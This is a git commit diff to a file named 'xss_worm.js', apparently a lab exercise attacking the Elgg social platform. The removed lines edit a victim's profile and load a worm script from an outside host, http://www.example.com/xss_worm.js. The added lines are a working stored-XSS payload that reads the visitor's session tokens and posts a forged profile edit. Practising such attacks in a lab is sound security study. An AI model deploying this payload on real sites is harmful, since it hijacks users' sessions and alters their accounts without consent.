b4abaf079c1a5ac5efa204c793bd6d490ce32557
MJ <98680218+namminju@users.noreply.github.com>
2024-05-23 04:30:19 +0900

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,22 +1,19 @@
-// 피해자의 프로필을 수정하는 코드
-var desc = encodeURIComponent("You've been hacked!"); // 감염된 프로필에 입력될 내용
-var content = {
-    description: desc
-};
-
-elgg.action('profile/edit', {
-    data: content,
-    success: function(response) {
-        // 프로필 수정이 성공했을 때 실행되는 코드
-        console.log('Profile updated successfully');
-    },
-    error: function(response) {
-        // 프로필 수정이 실패했을 때 실행되는 코드
-        console.error('Failed to update profile');
+<script type="text/javascript">
+window.onload=function(){
+    var userName="&name="+elgg.session.user.name;
+    var guid="&guid="+elgg.session.user.guid;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    var desc = encodeURIComponent("hacked"); // FILL IN 프로필에 입력될 내용
+    var content= "description=" + desc + userName + guid + ts + token; // FILL IN 리퀘스트 구성하는 매개변수 입력
+    var sendurl = "/action/profile/edit"; // FILL IN
+    var samygid= 49; //FILL IN
+    if (elgg.session.user.guid!=samygid){
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
     }
-});
-
-// 웜을 다른 프로필에 복사하여 전파하는 코드
-var wormScript = document.createElement('script');
-wormScript.src = 'http://www.example.com/xss_worm.js'; // 웜 스크립트의 URL을 여기에 입력
-document.body.appendChild(wormScript);
+}
+</script>  
